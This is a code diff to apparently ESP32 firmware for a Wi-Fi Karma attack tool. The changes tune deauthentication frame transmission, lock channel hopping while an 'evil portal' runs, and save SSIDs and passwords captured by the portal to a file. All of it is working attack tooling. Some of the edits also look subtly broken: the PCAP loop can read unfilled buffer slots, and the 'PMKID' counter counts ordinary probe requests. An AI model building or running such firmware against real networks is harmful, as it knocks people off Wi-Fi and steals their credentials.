@@ -30,9 +30,9 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 
 #define FILENAME "probe_capture_"
 #define SAVE_INTERVAL 10
-#define MAX_PROBE_BUFFER 200
-#define MAC_CACHE_SIZE 100
-#define MAX_CLIENT_TRACK 30
+#define MAX_PROBE_BUFFER 500
+#define MAC_CACHE_SIZE 200
+#define MAX_CLIENT_TRACK 50
 #define FAST_HOP_INTERVAL 250
 #define DEFAULT_HOP_INTERVAL 3000
 #define DEAUTH_INTERVAL 30000
@@ -48,6 +48,10 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define MAX_SSID_DB_SIZE 200
 #define MAX_POPULAR_SSIDS 20
 #define MAX_NETWORK_HISTORY 30
+#define ACTIVE_PORTAL_CHANNEL 0
+#define PROBE_CHECK_INTERVAL 50
+#define MAX_DEAUTH_PER_SECOND 10
+#define DEAUTH_BURST_WINDOW 1000
 
 const uint8_t vendorOUIs[][3] PROGMEM = {
     {0x00, 0x50, 0xF2}, {0x00, 0x1A, 0x11}, {0x00, 0x1B, 0x63}, {0x00, 0x24, 0x01},
@@ -73,6 +77,11 @@ const uint8_t ht_cap[] PROGMEM = {0xef, 0x09, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00
                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 const uint8_t rotate_channels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};
+
+uint8_t activePortalChannel = 0;
+unsigned long lastProbeCheck = 0;
+unsigned long deauthCount[14] = {0};
+unsigned long lastDeauthReset = 0;
 
 std::vector<String> SSIDDatabase::ssidCache;
 bool SSIDDatabase::cacheLoaded = false;
@@ -885,6 +894,24 @@ void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
 
 void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
     if (!karmaConfig.enableDeauth) return;
+    
+    unsigned long now = millis();
+    if (now - lastDeauthReset > DEAUTH_BURST_WINDOW) {
+        memset(deauthCount, 0, sizeof(deauthCount));
+        lastDeauthReset = now;
+    }
+    
+    if (channel >= 1 && channel <= 14) {
+        if (deauthCount[channel-1] >= MAX_DEAUTH_PER_SECOND) {
+            return;
+        }
+        deauthCount[channel-1]++;
+    }
+    
+    if (activePortalChannel > 0 && channel != activePortalChannel) {
+        return;
+    }
+    
     uint8_t deauthPacket[26] = {0};
     deauthPacket[0] = 0xC0;
     deauthPacket[1] = 0x00;
@@ -899,8 +926,10 @@ void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
     deauthPacket[22] = 0x01;
     deauthPacket[23] = 0x00;
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 24, false);
-    deauthPacketsSent++;
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 24, false);
+    if (err == ESP_OK) {
+        deauthPacketsSent++;
+    }
 }
 
 void sendBeaconFrames() {
@@ -997,6 +1026,15 @@ void checkForAssociations() {
 
 void smartChannelHop() {
     if (!auto_hopping) return;
+    
+    if (activePortalChannel > 0) {
+        if (channl != activePortalChannel - 1) {
+            channl = activePortalChannel - 1;
+            esp_wifi_set_channel(activePortalChannel, WIFI_SECOND_CHAN_NONE);
+        }
+        return;
+    }
+    
     unsigned long now = millis();
     if (now - last_ChannelChange < hop_interval) return;
     if (channelActivity[channl] > 20) { hop_interval = DEFAULT_HOP_INTERVAL * 3; return; }
@@ -1280,13 +1318,16 @@ void saveCredentialsToFile(String ssid, String password) {
 }
 
 void launchTieredEvilPortal(PendingPortal &portal) {
+    activePortalChannel = portal.channel;
+    auto_hopping = false;
+    channl = portal.channel - 1;
+    
     Serial.printf("[TIER-%d] Launching portal for %s\n", portal.tier, portal.ssid.c_str());
     isPortalActive = true;
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     delay(500);
-    EvilPortal portalInstance(portal.ssid, portal.channel, 
-                            karmaConfig.enableDeauth, portal.verifyPassword, true);
+    EvilPortal portalInstance(portal.ssid, portal.channel, false, portal.verifyPassword, true);
     String capturedSSID = "";
     String capturedPassword = "";
     bool hasCredential = false;
@@ -1302,6 +1343,8 @@ void launchTieredEvilPortal(PendingPortal &portal) {
     }
     if (hasCredential) saveCredentialsToFile(capturedSSID, capturedPassword);
     isPortalActive = false;
+    activePortalChannel = 0;
+    auto_hopping = true;
     if (portal.isCloneAttack) cloneAttacksLaunched++;
     else autoPortalsLaunched++;
     screenNeedsRedraw = true;
@@ -1382,13 +1425,19 @@ void checkPendingPortals() {
 }
 
 void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd) {
+    activePortalChannel = channel;
+    auto_hopping = false;
+    channl = channel - 1;
+    
     Serial.printf("[MANUAL] Launching Evil Portal for %s (ch%d)\n", ssid.c_str(), channel);
     isPortalActive = true;
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     delay(500);
-    EvilPortal portalInstance(ssid, channel, karmaConfig.enableDeauth, verifyPwd, false);
+    EvilPortal portalInstance(ssid, channel, false, verifyPwd, false);
     isPortalActive = false;
+    activePortalChannel = 0;
+    auto_hopping = true;
     restartKarmaAfterPortal = true;
 }
 
@@ -1456,10 +1505,8 @@ void saveProbesToPCAP(FS &fs) {
     file.write((uint8_t*)&snaplen, 4);
     file.write((uint8_t*)&network, 4);
     
-    int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
     int written = 0;
-    
-    for (int i = 0; i < count && written < 50; i++) {
+    for (int i = 0; i < MAX_PROBE_BUFFER && written < 50; i++) {
         int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
         const ProbeRequest &probe = probeBuffer[idx];
         
@@ -1479,7 +1526,7 @@ void saveProbesToPCAP(FS &fs) {
     file.close();
     
     if (written > 0) {
-        Serial.printf("[PCAP] Saved %d real probe requests to %s\n", written, filename.c_str());
+        Serial.printf("[PCAP] Saved %d probe requests to %s\n", written, filename.c_str());
         displayTextLine("PCAP: " + String(written) + " packets");
     } else {
         Serial.println("[PCAP] No probe frames to save");
@@ -1490,6 +1537,14 @@ void saveProbesToPCAP(FS &fs) {
 
 void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT) return;
+    
+    if (activePortalChannel > 0) {
+    } else {
+        unsigned long now = millis();
+        if (now - lastProbeCheck < PROBE_CHECK_INTERVAL) return;
+        lastProbeCheck = now;
+    }
+    
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
     const uint8_t *frame = pkt->payload;
@@ -1512,6 +1567,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     addMACToCache(cacheKey);
     
     RSNInfo rsn = extractRSNInfo(pkt->payload, pkt->rx_ctrl.sig_len);
+    bool hasRSNInfo = (rsn.akmSuite > 0 || rsn.pairwiseCipher > 0);
     
     ProbeRequest probe;
     probe.mac = mac;
@@ -1520,9 +1576,14 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     probe.timestamp = millis();
     probe.channel = pgm_read_byte(&karma_channels[channl % 14]);
     
-    probe.frame_len = pkt->rx_ctrl.sig_len;
-    if (probe.frame_len > 128) probe.frame_len = 128;
-    memcpy(probe.frame, pkt->payload, probe.frame_len);
+    if (hasRSNInfo) {
+        probe.frame_len = pkt->rx_ctrl.sig_len;
+        if (probe.frame_len > 128) probe.frame_len = 128;
+        memcpy(probe.frame, pkt->payload, probe.frame_len);
+        pmkidCaptured++;
+    } else {
+        probe.frame_len = 0;
+    }
     
     probeBuffer[probeBufferIndex] = probe;
     probeBufferIndex = (probeBufferIndex + 1) % MAX_PROBE_BUFFER;
@@ -1682,6 +1743,8 @@ void updateKarmaDisplay() {
         tft.print("Queue: " + String(responseQueue.size()));
         tft.setCursor(tftWidth/2, tftHeight - 40);
         tft.print("MAC: " + String(currentBSSID[5] & 0xFF, HEX));
+        tft.setCursor(tftWidth/2, tftHeight - 30);
+        tft.print("PMKID: " + String(pmkidCaptured));
         if (broadcastAttack.isActive()) {
             tft.setCursor(tftWidth - 150, tftHeight - 100);
             tft.print("BROADCAST");
@@ -1815,11 +1878,13 @@ void karma_setup() {
     for (;;) {
         if (restartKarmaAfterPortal) {
             restartKarmaAfterPortal = false;
+            activePortalChannel = 0;
             esp_wifi_set_promiscuous(false);
             esp_wifi_set_promiscuous_rx_cb(nullptr);
             esp_wifi_start();
             esp_wifi_set_promiscuous(true);
             esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
+            auto_hopping = true;
             esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
             screenNeedsRedraw = true;
         }
@@ -2094,6 +2159,8 @@ void karma_setup() {
                     tft.print("Vulnerable: " + String(vulnCount));
                     tft.setCursor(10, y); y += 15;
                     tft.print("Pending: " + String(pendingPortals.size()));
+                    tft.setCursor(10, y); y += 15;
+                    tft.print("PMKID: " + String(pmkidCaptured));
                     tft.setCursor(10, tftHeight - 20);
                     tft.print("Sel: Back");
                     while (!check(SelPress) && !check(EscPress)) {
